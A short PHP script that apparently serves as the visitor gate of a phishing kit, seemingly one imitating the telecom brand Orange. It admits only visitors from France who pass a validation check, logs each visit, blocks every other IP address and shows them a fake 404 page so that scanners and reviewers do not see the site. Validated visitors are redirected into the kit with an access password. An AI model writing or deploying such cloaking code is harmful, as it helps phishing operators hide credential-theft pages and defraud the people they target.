<?php
$fine = 'check';
(@require_once './orange/init.php') or die("<h1>Your File Not Including init</h1>");


if($country !== "france"):
    $status = "<font color='red'>False</font>";
    visiteur($status,$ip);
    Add_block($ip);
    header("HTTP/1.1 404 Not Found");
    exit();

else:
    if(check_validate($ip,$dream) !== false):

        $status = "<font color='green'>True</font>";
        Add_User($ip);
        visiteur($status,$ip);
        go_to(ROOT_FOLDER."/index.php?pwd=".PWESS."&cheking=pass&".$id."&access=");
        exit();
        
    else:
        $status = "<font color='red'>False</font>";
        visiteur($status,$ip);
        Add_block($ip);
        header("HTTP/1.1 404 Not Found");
        exit();

    endif;

endif;